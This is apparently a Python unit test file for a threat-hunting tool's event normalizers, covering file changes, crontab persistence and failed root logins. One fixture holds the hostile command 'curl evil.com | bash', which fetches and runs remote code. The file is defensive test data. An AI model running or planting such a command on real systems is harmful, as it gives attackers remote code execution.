import unittest
from thhunt.normalization.normalize_file import normalize_file_event
from thhunt.normalization.normalize_persistence import normalize_persistence_event
from thhunt.normalization.normalize_auth import normalize_auth_event

class TestExtraNormalization(unittest.TestCase):
    def test_normalize_file_event(self):
        raw = {
            "type": "file_change",
            "timestamp": 1000,
            "payload": {
                "path": "/etc/passwd",
                "action": "modified",
                "hash": "abc1234"
            }
        }
        norm = normalize_file_event(raw)
        self.assertEqual(norm["category"], "file")
        self.assertEqual(norm["file"]["path"], "/etc/passwd")

    def test_normalize_persistence_event(self):
        raw = {
            "type": "persistence_change",
            "timestamp": 1000,
            "payload": {
                "mechanism": "crontab",
                "command": "curl evil.com | bash"
            }
        }
        norm = normalize_persistence_event(raw)
        self.assertEqual(norm["category"], "persistence")
        self.assertEqual(norm["persistence"]["mechanism"], "crontab")

    def test_normalize_auth_event(self):
        raw = {
            "type": "auth_event",
            "timestamp": 1000,
            "payload": {
                "user": "root",
                "result": "failure",
                "src_ip": "1.2.3.4"
            }
        }
        norm = normalize_auth_event(raw)
        self.assertEqual(norm["category"], "auth")
        self.assertEqual(norm["auth"]["result"], "failure")

if __name__ == '__main__':
    unittest.main()
